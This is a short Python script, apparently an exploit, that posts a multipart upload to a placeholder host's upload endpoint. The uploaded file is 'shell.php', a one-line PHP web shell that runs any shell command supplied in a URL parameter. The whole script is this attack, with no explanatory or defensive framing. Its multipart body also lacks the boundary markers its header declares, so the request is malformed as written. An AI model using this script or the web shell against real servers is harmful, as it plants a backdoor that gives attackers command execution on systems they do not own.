import requests
body = 'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>'
requests.post('http://example.invalid/upload', data=body, headers={'Content-Type': 'multipart/form-data; boundary=foo'})
